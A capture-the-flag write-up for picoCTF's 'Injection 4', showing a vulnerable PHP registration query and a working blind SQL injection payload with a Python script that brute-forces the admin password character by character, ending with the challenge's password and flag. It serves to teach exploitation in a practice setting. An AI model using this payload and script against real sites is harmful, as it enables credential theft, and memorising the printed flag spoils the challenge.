# Injection 4 Writeup
##### By sdamashek of TJ CSL

Injection 4 has two forms, one to log in and one to register. Looking at the code, we saw that `login.php` calls `mysqli_real_escape_string()` on both the `POST`ed username and password, so there was no way to trick the service into letting us log in using SQL injection. However, `register.php` (which took only a username) does not filter the `POST`ed username:

```php
$username = $_POST["username"];
$query = "SELECT * FROM users WHERE username='$username'";
$result = mysqli_query($con, $query);

if (mysqli_num_rows($result) !== 0) {
  die("Someone has already registered " . htmlspecialchars($username));
}

die("Registration has been disabled.");
```

However, because we don't get the results of the query, only if there are results, we can't just retrieve the password using simple injection and use it to log in; we have to be more clever. The way we did it was to brute force the password one character at a time using the [`LIKE` operator](http://www.w3schools.com/sql/sql_like.asp). Since we knew the username was admin, if we passed a username of `admin AND PASSWORD LIKE 'a%'-- `, and the result was `Someone has already registered [username]`, then we know `admin`'s password starts with `a`. I wrote a quick python script to get the password one character at a time using this method:

```py
passchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$^&*()_+-=.,<>?/[]{}'

import requests
password = ''

while True:
    print password
    for i in passchars:
        r = requests.post('http://web2014.picoctf.com/injection4/register.php',data={'username':"admin' AND PASSWORD LIKE '"+password+i+"%'-- "}).text
        if 'has already registered' in r:
            password = password + i
            break
```

After letting it run for a bit, it stopped giving new characters at `youllneverguessthispassword`. Logging in with `admin` and `youllneverguessthispassword` gave us the flag, `whereof_one_cannot_speak_thereof_one_must_be_silent`.
